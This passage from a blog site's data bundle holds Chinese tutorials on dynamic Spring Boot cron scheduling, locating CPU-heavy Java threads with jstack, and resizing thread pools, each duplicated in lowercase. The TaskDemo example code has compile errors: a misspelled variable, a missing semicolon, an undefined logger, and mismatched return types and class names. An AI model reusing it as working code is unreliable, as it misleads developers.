2、代码实现\n\n下面来看看可以在不停服务的情况下动态修改任务周期的实现，步骤如下：\n\n在定时任务类上增加@EnableScheduling注解，并实现SchedulingConfigurer接口。（值得注意的是：@EnableScheduling对Spring的版本要求比较高，一开始使用的3.2.6版本时一直未成功，后来改成4.2.5版本就可以了） 设置一个静态变量cron，用于存放任务执行周期参数。 另辟一线程，用于模拟实际业务中外部原因修改了任务执行周期。 设置任务触发器，触发任务执行，其中就可以修改任务的执行周期。\n\n定时任务配置类：\n\npackage com.example.demo.scheduled;\n \nimport com.google.common.util.concurrent.ThreadFactoryBuilder;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.scheduling.annotation.EnableScheduling;\nimport org.springframework.scheduling.annotation.SchedulingConfigurer;\nimport org.springframework.scheduling.config.ScheduledTaskRegistrar;\nimport org.springframework.scheduling.support.CronTrigger;\nimport java.util.concurrent.Executor;\nimport java.util.concurrent.Executors;\nimport java.util.concurrent.ThreadFactory;\n \n/**\n * @Description: 基于接口SchedulingConfigurer的动态定时任务\n */\n@Configuration\n@EnableScheduling\npublic abstract class SchedulingAbstractDynamicCroTask implements SchedulingConfigurer {\n \n    //定时任务周期表达式\n    private String cron;\n    \n    /** \n     * @Description:  重写配置定时任务的方法\n     */\n    @Override\n    public void configureTasks(ScheduledTaskRegistrar scheduledTaskRegistrar) {\n        scheduledTaskRegistrar.setScheduler(taskScheduler());\n        scheduledTaskRegistrar.addTriggerTask(\n                //执行定时任务\n                () ->\n                {\n                    if(getSwitch()) {\n                        taskService();\n                    }\n                },\n                //设置触发器\n                triggerContext -> {\n                   cron = getCron();//获取定时任务周期表达式\n                   CronTrigger trigger = new CronTrigger(cron);\n                   return trigger.nextExecutionTime(triggerContext);\n                }\n        );\n \n    }\n \n    @Bean\n    public Executor taskScheduler() {\n        //设置线程名称\n        ThreadFactory namedThreadFactory = new ThreadFactoryBuilder().setNameFormat("demo-pool-%d").build();\n        //创建线程池\n        return Executors.newScheduledThreadPool(5, namedThreadFactory);\n    }\n \n    /**\n     * @Description: 执行定时任务\n     */\n    public abstract void taskService();\n \n    /**\n     * @Description: 获取定时任务周期表达式\n     */\n    public abstract String getCron();\n    \n    /**\n     * @Description: 定时任务开关，true为执行\n     */\n    public abstract boolean getSwitch();\n \n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n\n\n定时任务\n\npackage com.example.demo.scheduled;\n \nimport com.baomidou.mybatisplus.core.conditions.query.QueryWrapper;\nimport com.example.demo.dao.CronMapper;\nimport com.example.demo.entity.Scheduled;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.context.annotation.Configuration;\n \nimport java.time.LocalDateTime;\n \n/**\n * @Description:\n * @Author: \n */\n@Configuration\npublic class TaskDemo extends ConfigurerSchedulingDemo {\n \n    @Autowired      //注入mapper\n    @SuppressWarnings("all")\n    CronMapper cronMapper;\n    \n    private boolean openFlag = true;\n \n    @Override\n    public void taskService() {\n        System.out.println("定时任务demo1:"\n                           + LocalDateTime.now()+"，线程名称："+Thread.currentThread().getName()\n                           + " 线程id："+Thread.currentThread().getId());\n    }\n \n    @Override\n    public String getCron() {\n        final String defaultCron = "0 */10 * * * ?";\n        QueryWrapper<Scheduled> queryWrapper = new QueryWrapper<>();\n        queryWrapper.eq("name","demo1");\n        Scheduled scheduled = cronMapper.selectOne(queryWrapper);\n        if(scheduled != null) {\n            String cron = scheduled.getCron();\n            Integer status = scheduled.getStatus();\n            openFlag = status == 1 ? true : false;\n            if(!openFalg) {\n                logger.warn("定时任务状态为关闭，不执行此次任务。scheduled:[{}]", scheduled)\n            }\n            return cron;\n        }\n        logger.error("获取cron失败，采用默认cron。scheduled:[{}]", scheduled);\n        return defaultCron;\n    }\n \n    @Override\n    public Integer getSwitch() {\n        return openFlag;\n    }\n \n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n\n\n\n# 3、效果展示\n\n启动项目：控制台输出展示\n\n\n\n修改数据库 demo1的执行时间为每15秒一次：\n\n\n\n关闭demo1的定时任务，将demo1的open状态改为0：\n\n\n\n\n# 总结\n\n此方法，是在触发运行的时候，刷新定时规则，这种方法的缺点是，刷新规则的时间必须是在某次触发运行的时候。\n\n另一种是：https://blog.csdn.net/jianggujin/article/details/77937316\n\n此方法基于 SchedulingConfigurer 的源码，捕获 ScheduledTaskRegistrar 类的实例，通过该类中的 TaskScheduler 实例操作定时任务的增删，而非采用 ScheduledTaskRegistrar.addTriggerTask 方法维护定时任务。所以需要自行写代码维护定时任务列表，控制任务的删减，代码的实现比较繁琐。\n\n如果想要实现可以动态修改的定时策略，建议使用开源组件 Quartz。\n\n\n# 参考\n\n * https://blog.csdn.net/chenping1993/article/details/108274814',normalizedContent:' * 修改定时任务不重启项目，springboot如何实现？\n * 1、建表 管理定时任务\n * 2、代码实现\n * 3、效果展示\n * 总结\n * 参考\n\n\n\n\n# 修改定时任务不重启项目，springboot如何实现？\n\n业务场景描述：定时任务的任务名称，cron（定时任务表达式），定时任务开关，存储在数据库表中。在不重启项目的情况下，修改定时任务表达式，可以实时获取新的定时任务执行时间规则；修改定时任务执行状态，可以随时开关定时任务。\n\n使用技术：基于接口 schedulingconfigurer\n\n\n# 1、建表 管理定时任务\n\ndrop table if exists `scheduled_cron`;\ncreate table `scheduled` (\n  `id` int(11) not null auto_increment,\n  `name` varchar(20) default null,\n  `cron` varchar(30) default null,\n  `description` varchar(30) default null comment \'描述\',\n  `create_user` varchar(30) default null comment \'创建人\',\n  `status` tinyint(1) default null comment \'1开启， 0关闭\',\n  `create_time` datetime default null comment \'创建时间\',\n) engine=innodb default charset=utf8;\n \n-- ----------------------------\n-- records of scheduled\n-- ----------------------------\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# 2、代码实现\n\n下面来看看可以在不停服务的情况下动态修改任务周期的实现，步骤如下：\n\n在定时任务类上增加@enablescheduling注解，并实现schedulingconfigurer接口。（值得注意的是：@enablescheduling对spring的版本要求比较高，一开始使用的3.2.6版本时一直未成功，后来改成4.2.5版本就可以了） 设置一个静态变量cron，用于存放任务执行周期参数。 另辟一线程，用于模拟实际业务中外部原因修改了任务执行周期。 设置任务触发器，触发任务执行，其中就可以修改任务的执行周期。\n\n定时任务配置类：\n\npackage com.example.demo.scheduled;\n \nimport com.google.common.util.concurrent.threadfactorybuilder;\nimport org.springframework.context.annotation.bean;\nimport org.springframework.context.annotation.configuration;\nimport org.springframework.scheduling.annotation.enablescheduling;\nimport org.springframework.scheduling.annotation.schedulingconfigurer;\nimport org.springframework.scheduling.config.scheduledtaskregistrar;\nimport org.springframework.scheduling.support.crontrigger;\nimport java.util.concurrent.executor;\nimport java.util.concurrent.executors;\nimport java.util.concurrent.threadfactory;\n \n/**\n * @description: 基于接口schedulingconfigurer的动态定时任务\n */\n@configuration\n@enablescheduling\npublic abstract class schedulingabstractdynamiccrotask implements schedulingconfigurer {\n \n    //定时任务周期表达式\n    private string cron;\n    \n    /** \n     * @description:  重写配置定时任务的方法\n     */\n    @override\n    public void configuretasks(scheduledtaskregistrar scheduledtaskregistrar) {\n        scheduledtaskregistrar.setscheduler(taskscheduler());\n        scheduledtaskregistrar.addtriggertask(\n                //执行定时任务\n                () ->\n                {\n                    if(getswitch()) {\n                        taskservice();\n                    }\n                },\n                //设置触发器\n                triggercontext -> {\n                   cron = getcron();//获取定时任务周期表达式\n                   crontrigger trigger = new crontrigger(cron);\n                   return trigger.nextexecutiontime(triggercontext);\n                }\n        );\n \n    }\n \n    @bean\n    public executor taskscheduler() {\n        //设置线程名称\n        threadfactory namedthreadfactory = new threadfactorybuilder().setnameformat("demo-pool-%d").build();\n        //创建线程池\n        return executors.newscheduledthreadpool(5, namedthreadfactory);\n    }\n \n    /**\n     * @description: 执行定时任务\n     */\n    public abstract void taskservice();\n \n    /**\n     * @description: 获取定时任务周期表达式\n     */\n    public abstract string getcron();\n    \n    /**\n     * @description: 定时任务开关，true为执行\n     */\n    public abstract boolean getswitch();\n \n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n\n\n定时任务\n\npackage com.example.demo.scheduled;\n \nimport com.baomidou.mybatisplus.core.conditions.query.querywrapper;\nimport com.example.demo.dao.cronmapper;\nimport com.example.demo.entity.scheduled;\nimport org.springframework.beans.factory.annotation.autowired;\nimport org.springframework.context.annotation.configuration;\n \nimport java.time.localdatetime;\n \n/**\n * @description:\n * @author: \n */\n@configuration\npublic class taskdemo extends configurerschedulingdemo {\n \n    @autowired      //注入mapper\n    @suppresswarnings("all")\n    cronmapper cronmapper;\n    \n    private boolean openflag = true;\n \n    @override\n    public void taskservice() {\n        system.out.println("定时任务demo1:"\n                           + localdatetime.now()+"，线程名称："+thread.currentthread().getname()\n                           + " 线程id："+thread.currentthread().getid());\n    }\n \n    @override\n    public string getcron() {\n        final string defaultcron = "0 */10 * * * ?";\n        querywrapper<scheduled> querywrapper = new querywrapper<>();\n        querywrapper.eq("name","demo1");\n        scheduled scheduled = cronmapper.selectone(querywrapper);\n        if(scheduled != null) {\n            string cron = scheduled.getcron();\n            integer status = scheduled.getstatus();\n            openflag = status == 1 ? true : false;\n            if(!openfalg) {\n                logger.warn("定时任务状态为关闭，不执行此次任务。scheduled:[{}]", scheduled)\n            }\n            return cron;\n        }\n        logger.error("获取cron失败，采用默认cron。scheduled:[{}]", scheduled);\n        return defaultcron;\n    }\n \n    @override\n    public integer getswitch() {\n        return openflag;\n    }\n \n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n\n\n\n# 3、效果展示\n\n启动项目：控制台输出展示\n\n\n\n修改数据库 demo1的执行时间为每15秒一次：\n\n\n\n关闭demo1的定时任务，将demo1的open状态改为0：\n\n\n\n\n# 总结\n\n此方法，是在触发运行的时候，刷新定时规则，这种方法的缺点是，刷新规则的时间必须是在某次触发运行的时候。\n\n另一种是：https://blog.csdn.net/jianggujin/article/details/77937316\n\n此方法基于 schedulingconfigurer 的源码，捕获 scheduledtaskregistrar 类的实例，通过该类中的 taskscheduler 实例操作定时任务的增删，而非采用 scheduledtaskregistrar.addtriggertask 方法维护定时任务。所以需要自行写代码维护定时任务列表，控制任务的删减，代码的实现比较繁琐。\n\n如果想要实现可以动态修改的定时策略，建议使用开源组件 quartz。\n\n\n# 参考\n\n * https://blog.csdn.net/chenping1993/article/details/108274814',charsets:{cjk:!0},lastUpdated:"2024/11/15, 20:41:37",lastUpdatedTimestamp:1731674497e3},{title:"找出某个Java进程中最耗费CPU的Java线程",frontmatter:{title:"找出某个Java进程中最耗费CPU的Java线程",date:"2021-12-06T00:00:00.000Z",tags:["多线程","Java"],categories:["后端 Back-end"],isShowComments:!0},regularPath:"/views/backend/ThreadTopCPU.html",relativePath:"views/backend/ThreadTopCPU.md",key:"v-7bad74ce",path:"/views/backend/ThreadTopCPU.html",headers:[{level:2,title:"问题原因",slug:"问题原因",normalizedTitle:"问题原因",charIndex:72},{level:2,title:"排查步骤",slug:"排查步骤",normalizedTitle:"排查步骤",charIndex:80},{level:3,title:"jps",slug:"jps",normalizedTitle:"jps",charIndex:90},{level:3,title:"jstack",slug:"jstack",normalizedTitle:"jstack",charIndex:53},{level:2,title:"其他问题排查",slug:"其他问题排查",normalizedTitle:"其他问题排查",charIndex:109},{level:2,title:"相关脚本",slug:"相关脚本",normalizedTitle:"相关脚本",charIndex:119}],excerpt:"<Boxx/>\n<p>找出某个Java进程中最耗费CPU的Java线程并定位堆栈信息，用到的命令有：ps、top、printf、jstack、grep。</p>\n",headersStr:"问题原因 排查步骤 jps jstack 其他问题排查 相关脚本",content:'找出某个Java进程中最耗费CPU的Java线程并定位堆栈信息，用到的命令有：ps、top、printf、jstack、grep。\n\n\n\n * 问题原因\n * 排查步骤\n   * jps\n   * jstack\n * 其他问题排查\n * 相关脚本\n\n\n\n\n# 问题原因\n\n现实企业级Java应用开发、维护中，有时候我们会碰到下面这些问题：\n\n * OutOfMemoryError，内存不足\n * 内存泄露\n * 线程死锁\n * 锁争用（Lock Contention）\n * Java进程消耗CPU过高 ......\n\n这些问题在日常开发、维护中可能被很多人忽视（比如有的人遇到上面的问题只是重启服务器或者调大内存，而不会深究问题根源），但能够理解并解决这些问题是Java程序员进阶的必备要求。\n\n\n# 排查步骤\n\n\n# jps\n\njps主要用来输出JVM中运行的进程状态信息。语法格式如下：\n\njps [options] [hostid]\n\n\n1\n\n\n如果不指定hostid就默认为当前主机或服务器。\n\n命令行参数选项说明如下：\n\n-q 不输出类名,Jar名和传入main方法的参数\n\n-m 输出传入main方法的参数\n\n-l 输出main类或Jar的全限名\n\n-v 输出传入JVM的参数\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n比如下面：\n\nroot@ubuntu:/# jps -m -l\n2458 org.artifactory.standalone.main.Main /usr/local/artifactory-2.2.5/etc/jetty.xml\n29920 com.sun.tools.hat.Main -port 9998 /tmp/dump.dat\n3149 org.apache.catalina.startup.Bootstrap start\n30972 sun.tools.jps.Jps -m -l\n8247 org.apache.catalina.startup.Bootstrap start\n25687 com.sun.tools.hat.Main -port 9999 dump.dat\n21711 mrf-center.jar\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# jstack\n\njstack主要用来查看某个Java进程内的线程堆栈信息。语法格式如下：\n\njstack [option] pid\njstack [option] executable core\njstack [option] [server-id@]remote-hostname-or-ip\n\n\n1\n2\n3\n\n\n命令行参数选项说明如下：\n\n# 会打印出额外的锁信息\n# 在发生死锁时可以用 jstack -l pid 来观察锁持有情况\n# -m mixed mode，不仅会输出Java堆栈信息，还会输出C/C++堆栈信息（比如Native方法）\n-l long listings\n\n\n1\n2\n3\n4\n\n\njstack可以定位到线程堆栈，根据堆栈信息我们可以定位到具体代码，所以它在JVM性能调优中使用得非常多。\n\n下面我们来一个实例找出某个Java进程中最耗费CPU的Java线程并定位堆栈信息，用到的命令有ps、top、printf、jstack、grep。\n\n----------------------------------------\n\n第一步： 先找出Java进程ID，服务器上的Java应用名称为 wordcount.jar：\n\n[root@storm-master home] ps -ef | grep wordcount\nroot    2860  2547 13 02:09 pts/0  00:02:03 java -jar wordcount.jar /home/input 3 \n\n\n1\n2\n\n\n得到进程ID为 2860 。\n\n----------------------------------------\n\n第二步： 找出该进程内最耗费CPU的线程，可以使用如下3个命令，这里我们使用第3个命令得出如下结果：\n\n 1. ps -Lfp pid ： 即 ps -Lfp 2860\n\n 2. ps -mp pid -o THREAD, tid, time ：即 ps -mp 2860 -o THREAD,tid,time\n\n 3. top -Hp pid： 即 top -Hp 2860\n\n这里用第三个命令：top -Hp 2860\n\ntop -Hp 2860\n\n\n1\n\n\n输出如下：\n\n\n\nTIME列就是各个Java线程耗费的CPU时间，显然CPU时间最长的是ID为2968的线程，用\n\nprintf "%x\\n" 2968\n\n\n1\n\n\n得到2968的十六进制值为b98，下面会用到。\n\n----------------------------------------\n\n第三步： 终于轮到jstack上场了，它用来输出进程2860的堆栈信息，然后根据线程ID的十六进制值grep，如下：\n\n[root@storm-master home] jstack 2860 | grep b98 \n"SessionTracker" prio=10 tid=0x00007f55a44e4800 nid=0xb53 in Object.wait() [0x00007f558e06c000 \n\n\n1\n2\n\n\n可以看到CPU消耗在SessionTracker这个类的Object.wait()，于是就能很容易的定位到相关的代码了。\n\n当然，可以 jstack -l pid > /tmp/thread.txt 在导出的文件中搜索，就可以定位到具体的线程，类。\n\n----------------------------------------\n\n\n# 其他问题排查\n\n查看某进程及某线程占用 CPU 的例子\n\n * jps: 列出 java 进程,找到 pid.\n * pidstat -p pid -u 1 3 -u -t: 查看 pid 的进程所有线程的 cpu 使用情况.\n * jstack -l pid > /tmp/thread.txt: 导出指定 Java 应用的所有线程.\n\n然后查看 nid=xxx(即第二步里线程号的线程),即可定位到某段代码.\n\n查看某进程及某线程占用 IO 的例子\n\n * jps: 列出 java 进程,找到 pid.\n * pidstat -p pid -u 1 3 -d -t: 查看 pid 的进程所有线程的 IO 使用情况.\n * jstack -l pid > /tmp/thread.txt: 导出指定 Java 应用的所有线程.\n\n然后查看 nid=xxx(即第二步里线程号的线程),即可定位到某段代码.\n\n\n# 相关脚本\n\n 1. 阿里开源的 Arthas\n\n 2. 看了下有位大神提个 issue , 推荐了个自动化脚本, 亲测更好用点. 这样子就可以免去上面的一步一步地查找和计算了. 所以, 这里也直接引用这个工具, 有需要的可以用下.\n    show-busy-java-threads',normalizedContent:'找出某个java进程中最耗费cpu的java线程并定位堆栈信息，用到的命令有：ps、top、printf、jstack、grep。\n\n\n\n * 问题原因\n * 排查步骤\n   * jps\n   * jstack\n * 其他问题排查\n * 相关脚本\n\n\n\n\n# 问题原因\n\n现实企业级java应用开发、维护中，有时候我们会碰到下面这些问题：\n\n * outofmemoryerror，内存不足\n * 内存泄露\n * 线程死锁\n * 锁争用（lock contention）\n * java进程消耗cpu过高 ......\n\n这些问题在日常开发、维护中可能被很多人忽视（比如有的人遇到上面的问题只是重启服务器或者调大内存，而不会深究问题根源），但能够理解并解决这些问题是java程序员进阶的必备要求。\n\n\n# 排查步骤\n\n\n# jps\n\njps主要用来输出jvm中运行的进程状态信息。语法格式如下：\n\njps [options] [hostid]\n\n\n1\n\n\n如果不指定hostid就默认为当前主机或服务器。\n\n命令行参数选项说明如下：\n\n-q 不输出类名,jar名和传入main方法的参数\n\n-m 输出传入main方法的参数\n\n-l 输出main类或jar的全限名\n\n-v 输出传入jvm的参数\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n比如下面：\n\nroot@ubuntu:/# jps -m -l\n2458 org.artifactory.standalone.main.main /usr/local/artifactory-2.2.5/etc/jetty.xml\n29920 com.sun.tools.hat.main -port 9998 /tmp/dump.dat\n3149 org.apache.catalina.startup.bootstrap start\n30972 sun.tools.jps.jps -m -l\n8247 org.apache.catalina.startup.bootstrap start\n25687 com.sun.tools.hat.main -port 9999 dump.dat\n21711 mrf-center.jar\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# jstack\n\njstack主要用来查看某个java进程内的线程堆栈信息。语法格式如下：\n\njstack [option] pid\njstack [option] executable core\njstack [option] [server-id@]remote-hostname-or-ip\n\n\n1\n2\n3\n\n\n命令行参数选项说明如下：\n\n# 会打印出额外的锁信息\n# 在发生死锁时可以用 jstack -l pid 来观察锁持有情况\n# -m mixed mode，不仅会输出java堆栈信息，还会输出c/c++堆栈信息（比如native方法）\n-l long listings\n\n\n1\n2\n3\n4\n\n\njstack可以定位到线程堆栈，根据堆栈信息我们可以定位到具体代码，所以它在jvm性能调优中使用得非常多。\n\n下面我们来一个实例找出某个java进程中最耗费cpu的java线程并定位堆栈信息，用到的命令有ps、top、printf、jstack、grep。\n\n----------------------------------------\n\n第一步： 先找出java进程id，服务器上的java应用名称为 wordcount.jar：\n\n[root@storm-master home] ps -ef | grep wordcount\nroot    2860  2547 13 02:09 pts/0  00:02:03 java -jar wordcount.jar /home/input 3 \n\n\n1\n2\n\n\n得到进程id为 2860 。\n\n----------------------------------------\n\n第二步： 找出该进程内最耗费cpu的线程，可以使用如下3个命令，这里我们使用第3个命令得出如下结果：\n\n 1. ps -lfp pid ： 即 ps -lfp 2860\n\n 2. ps -mp pid -o thread, tid, time ：即 ps -mp 2860 -o thread,tid,time\n\n 3. top -hp pid： 即 top -hp 2860\n\n这里用第三个命令：top -hp 2860\n\ntop -hp 2860\n\n\n1\n\n\n输出如下：\n\n\n\ntime列就是各个java线程耗费的cpu时间，显然cpu时间最长的是id为2968的线程，用\n\nprintf "%x\\n" 2968\n\n\n1\n\n\n得到2968的十六进制值为b98，下面会用到。\n\n----------------------------------------\n\n第三步： 终于轮到jstack上场了，它用来输出进程2860的堆栈信息，然后根据线程id的十六进制值grep，如下：\n\n[root@storm-master home] jstack 2860 | grep b98 \n"sessiontracker" prio=10 tid=0x00007f55a44e4800 nid=0xb53 in object.wait() [0x00007f558e06c000 \n\n\n1\n2\n\n\n可以看到cpu消耗在sessiontracker这个类的object.wait()，于是就能很容易的定位到相关的代码了。\n\n当然，可以 jstack -l pid > /tmp/thread.txt 在导出的文件中搜索，就可以定位到具体的线程，类。\n\n----------------------------------------\n\n\n# 其他问题排查\n\n查看某进程及某线程占用 cpu 的例子\n\n * jps: 列出 java 进程,找到 pid.\n * pidstat -p pid -u 1 3 -u -t: 查看 pid 的进程所有线程的 cpu 使用情况.\n * jstack -l pid > /tmp/thread.txt: 导出指定 java 应用的所有线程.\n\n然后查看 nid=xxx(即第二步里线程号的线程),即可定位到某段代码.\n\n查看某进程及某线程占用 io 的例子\n\n * jps: 列出 java 进程,找到 pid.\n * pidstat -p pid -u 1 3 -d -t: 查看 pid 的进程所有线程的 io 使用情况.\n * jstack -l pid > /tmp/thread.txt: 导出指定 java 应用的所有线程.\n\n然后查看 nid=xxx(即第二步里线程号的线程),即可定位到某段代码.\n\n\n# 相关脚本\n\n 1. 阿里开源的 arthas\n\n 2. 看了下有位大神提个 issue , 推荐了个自动化脚本, 亲测更好用点. 这样子就可以免去上面的一步一步地查找和计算了. 所以, 这里也直接引用这个工具, 有需要的可以用下.\n    show-busy-java-threads',charsets:{cjk:!0},lastUpdated:"2024/11/15, 20:41:37",lastUpdatedTimestamp:1731674497e3},{title:"线程池 - 动态调节参数",frontmatter:{title:"线程池 - 动态调节参数",date:"2021-11-24T00:00:00.000Z",tags:["多线程","Java"],categories:["后端 Back-end"],isShowComments:!0},regularPath:"/views/backend/ThreadPool2.html",relativePath:"views/backend/ThreadPool2.md",key:"v-7bd365d4",path:"/views/backend/ThreadPool2.html",headers:[{level:2,title:"背景",slug:"背景",normalizedTitle:"背景",charIndex:144},{level:2,title:"线程池任务调度机制",slug:"线程池任务调度机制",normalizedTitle:"线程池任务调度机制",charIndex:150},{level:2,title:"动态调节线程池参数实现",slug:"动态调节线程池参数实现",normalizedTitle:"动态调节线程池参数实现",charIndex:163},{level:3,title:"调节核心和最大线程数的原理",slug:"调节核心和最大线程数的原理",normalizedTitle:"调节核心和最大线程数的原理",charIndex:180},{level:3,title:"调节工作队列大小的原理",slug:"调节工作队列大小的原理",normalizedTitle:"调节工作队列大小的原理",charIndex:199},{level:2,title:"这个过程中涉及到的面试题有哪些？",slug:"这个过程中涉及到的面试题有哪些",normalizedTitle:"这个过程中涉及到的面试题有哪些？",charIndex:214},{level:2,title:"参考",slug:"参考",normalizedTitle:"参考",charIndex:234}],excerpt:"<Boxx/>\n<p>线程池是一种基于池化思想管理线程的工具，使用线程池可以减少创建销毁线程的开销，避免线程过多导致系统资源耗尽。在高并发的任务处理场景，线程池的使用是必不可少的。在双11主项目中为了提升处理性能，很多地方使用到了线程池。随着线程池的使用，逐渐发现一个问题，线程池的参数如何设置？</p>\n",headersStr:"背景 线程池任务调度机制 动态调节线程池参数实现 调节核心和最大线程数的原理 调节工作队列大小的原理 这个过程中涉及到的面试题有哪些？ 参考",content:"线程池是一种基于池化思想管理线程的工具，使用线程池可以减少创建销毁线程的开销，避免线程过多导致系统资源耗尽。在高并发的任务处理场景，线程池的使用是必不可少的。在双11主项目中为了提升处理性能，很多地方使用到了线程池。随着线程池的使用，逐渐发现一个问题，线程池的参数如何设置？\n\n\n\n * 背景\n * 线程池任务调度机制\n * 动态调节线程池参数实现\n   * 调节核心和最大线程数的原理\n   * 调节工作队列大小的原理\n * 这个过程中涉及到的面试题有哪些？\n * 参考\n\n\n\n\n# 背景\n\n根据任务的类型，线程池可以区分为IO密集型和CPU密集型，对于CPU密集型，一般经验是设置corePoolSize=CPU核数+1，对于IO密集型需要根据具体的RT和流量来设置，没有普适的经验值。然而，我们一般遇到的情况多数是处理IO密集型任务，如果线程池参数不可动态调节，就没办法根据实际情况实时调整处理速度，只能通过发布代码调整参数。\n\n如果线程池参数不合理会导致什么问题呢？下面列举几种可能出现的场景：最大线程数设置偏小，工作队列大小设置偏小，导致服务接口大量抛出RejectedExecutionException。\n\n最大线程数设置偏小，工作队列大小设置过大，任务堆积过度，接口响应时长变长。\n\n最大线程数设置过大，线程调度开销增大，处理速度反而下降。\n\n核心线程数设置过小，流量突增时需要先创建线程，导致响应时长过大。\n\n核心线程数设置过大，空闲线程太多，占用系统资源。\n\n\n# 线程池任务调度机制\n\n要明白线程池参数对运行时的影响，就必须理解其中的原理，所以下面先简单总结了线程池的核心原理。\n\nJava中的线程池核心实现类是ThreadPoolExecutor，ThreadPoolExecutor一方面维护自身的生命周期，另一方面同时管理线程和任务，使两者良好的结合从而执行并行任务。用户无需关注如何创建线程，如何调度线程来执行任务，用户只需提供Runnable对象，将任务的运行逻辑提交到执行器(Executor)中，由Executor框架完成线程的调配和任务的执行部分。\n\nThreadPoolExecutor是如何运行，如何同时维护线程和执行任务的呢？其运行机制如下图所示：\n\n\n\n所有任务的调度都是由execute方法完成的，这部分完成的工作是：检查现在线程池的运行状态、运行线程数、运行策略，决定接下来执行的流程，是直接申请线程执行，或是缓冲到队列中执行，亦或是直接拒绝该任务。其执行过程如下：首先检测线程池运行状态，如果不是RUNNING，则直接拒绝，线程池要保证在RUNNING的状态下执行任务。\n\n如果workerCount < corePoolSize，则创建并启动一个线程来执行新提交的任务。\n\n如果workerCount >= corePoolSize，且线程池内的阻塞队列未满，则将任务添加到该阻塞队列中。\n\n如果workerCount >= corePoolSize && workerCount < maximumPoolSize，且线程池内的阻塞队列已满，则创建并启动一个线程来执行新提交的任务。\n\n如果workerCount >= maximumPoolSize，并且线程池内的阻塞队列已满, 则根据拒绝策略来处理该任务, 默认的处理方式是直接抛异常。\n\n线程池参数中有几个比较关键的参数，分别是：\n\n 1. corePoolSize：核心线程数大小，不管它们创建以后是不是空闲的。线程池需要保持 corePoolSize 数量的线程，除非设置了 allowCoreThreadTimeOut；\n 2. maximumPoolSize：最大线程数，线程池中最多允许创建 maximumPoolSize 个线程;\n 3. keepAliveTime：存活时间，如果经过 keepAliveTime 时间后，超过核心线程数的线程还没有接受到新的任务，那就回收;\n 4. unit： keepAliveTime 的时间单位;\n 5. workQueue：存放待执行任务的队列：当提交的任务数超过核心线程数大小后，再提交的任务就存放在这里。它仅仅用来存放被 execute 方法提交的 Runnable 任务; 目前JDK提供了以下阻塞队列的实现：\n\n\n\n 6. threadFactory：线程工厂，用来创建线程工厂。比如这里面可以自定义线程名称，当进行虚拟机栈分析时，看着名字就知道这个线程是哪里来的，不会懵逼；\n 7. handler ：拒绝策略，当队列里面放满了任务、最大线程数的线程都在工作时，这时继续提交的任务线程池就处理不了，应该执行怎么样的拒绝策略；\n\n\n\n\n# 动态调节线程池参数实现\n\n线程池相关的重要参数有三个，分别是核心线程数、最大线程数和工作队列大小，接下来将阐述如何实现动态调节线程池参数。\n\n\n# 调节核心和最大线程数的原理\n\nThreadPoolExecutor已经提供了两个方法在运行时设置核心线程数和最大线程数，分别是ThreadPoolExecutor.setCorePoolSize()和ThreadPoolExecutor.setMaximumPoolSize()。\n\nsetCorePoolSize方法的执行流程是：首先会覆盖之前构造函数设置的corePoolSize，然后，如果新的值比原始值要小，当多余的工作线程下次变成空闲状态的时候会被中断并销毁，如果新的值比原来的值要大且工作队列不为空，则会创建新的工作线程。流程图如下：\n\nsetMaximumPoolSize方法执行流程是：首先会覆盖之前构造函数设置的maximumPoolSize，然后，如果新的值比原来的值要小，当多余的工作线程下次变成空闲状态的时候会被中断并销毁。\n\n代码设置：\n\n\n\n\n# 调节工作队列大小的原理\n\n线程池中是以生产者消费者模式，通过一个阻塞队列来缓存任务，工作线程从阻塞队列中获取任务。工作队列的接口是阻塞队列(BlockingQueue)，在队列为空时，获取元素的线程会等待队列变为非空，当队列满时，存储元素的线程会等待队列可用。\n\n目前JDK提供了以下阻塞队列的实现：\n\n\n\n但是很不幸，这些阻塞队列的实现都不支持动态调整大小，那么为什么不自己实现一个可动态调整大小的阻塞队列呢。重复造轮子是不可取的，所以选择改造轮子。LinkedBlockingQueue是比较常用的一个阻塞队列，它无法修改大小的原因是capacity字段设置成了final private final int capacity;。如果把final去掉，并提供修改capacity的方法，是不是就满足我们的需求呢？事实证明是可行的。\n\n所以要想动态修改只能自己实现一个BlockingQueue，然后capacity可以动态修改即可；复制一个LinkedBlockingQueue源码，将capacity的final修饰去掉，添加set方法，保存为ResizableCapacityLinkedBlockingQueue.java即可，然后使用ResizableCapacityLinkedBlockingQueue作为任务队列；\n\n\n\n\n# 